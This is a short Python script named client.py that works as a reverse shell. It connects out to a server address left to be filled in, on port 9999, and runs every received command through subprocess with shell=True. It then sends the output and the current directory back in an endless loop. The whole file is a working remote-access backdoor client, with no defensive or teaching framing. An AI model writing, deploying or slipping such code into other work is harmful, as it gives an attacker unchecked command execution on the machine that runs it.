import socket
import os
import subprocess

# create a Socket
def create_socket():
    global host
    global port 
    global s 

    host = '' # Server address note: if dynamic IP, need to update this
    port = 9999 # port that are not being used a lot
    try:
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ', str(msg))


# bind the Socket and listen to connections
def connect_socket():
    s.connect((host,port))


# decode commands
def decode_commands(data):
    current_wd = ''
    result_str = ''

    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True,
                                stdout=subprocess.PIPE, 
                                stdin=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        current_wd = os.getcwd() + '>'
        result_byte = cmd.stdout.read() + cmd.stderr.read()
        result_str = str(result_byte, 'utf-8')

    return current_wd, result_str


# service socket
def service_socket():
    data = s.recv(1024)                                 # receive commands from server
    current_wd, result_str = decode_commands(data)      # decode commands and execute on client
    s.send(str.encode(current_wd+result_str, 'utf-8'))  # send response to server
    print(result_str)                                   # print result to client console


if __name__ == "__main__":
    print('\n=======\nclient.py\n=======\n')

    create_socket()
    connect_socket()
    while True:
        service_socket()
            

